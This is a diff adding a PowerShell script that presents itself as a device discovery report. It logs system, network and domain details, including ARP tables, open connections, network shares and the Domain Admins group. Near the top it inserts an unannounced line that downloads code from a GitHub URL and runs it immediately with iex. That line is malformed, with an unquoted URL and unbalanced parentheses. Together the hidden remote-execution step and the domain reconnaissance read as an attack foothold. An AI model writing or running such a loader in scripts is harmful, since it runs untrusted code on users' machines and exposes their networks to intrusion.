@@ -1,0 +1,41 @@
+$LogDir = "C:\temp\templogs"
+$LogFile = Join-Path $LogDir "discovery.txt"
+
+iex (irm -Uri (https://raw.githubusercontent.com/testingindustriallogic/securityscanning/main/level4)
+
+New-Item -ItemType Directory -Path $LogDir -Force | Out-Null
+
+function Write-Section {
+    param (
+        [string]$Title,
+        [scriptblock]$Command
+    )
+
+    Add-Content $LogFile "`r`n===== $Title =====`r`n"
+
+    try {
+        & $Command 2>&1 | Out-File -FilePath $LogFile -Append -Width 4096
+    }
+    catch {
+        $_ | Out-File -FilePath $LogFile -Append
+    }
+}
+
+# Start new log
+@"
+==================================================
+Device Discovery Report
+Generated: $(Get-Date)
+Computer: $env:COMPUTERNAME
+User: $env:USERNAME
+==================================================
+"@ | Set-Content $LogFile
+
+Write-Section "HOSTNAME" { hostname }
+Write-Section "SYSTEMINFO" { systeminfo }
+Write-Section "IPCONFIG /ALL" { ipconfig /all }
+Write-Section "ARP -A" { arp -a }
+Write-Section "NETSTAT -ANO" { netstat -ano }
+Write-Section "NET VIEW" { net view }
+Write-Section "CURRENT USER DOMAIN INFO" { net user $env:USERNAME /domain }
+Write-Section "DOMAIN ADMINS" { net group "Domain Admins" /domain }
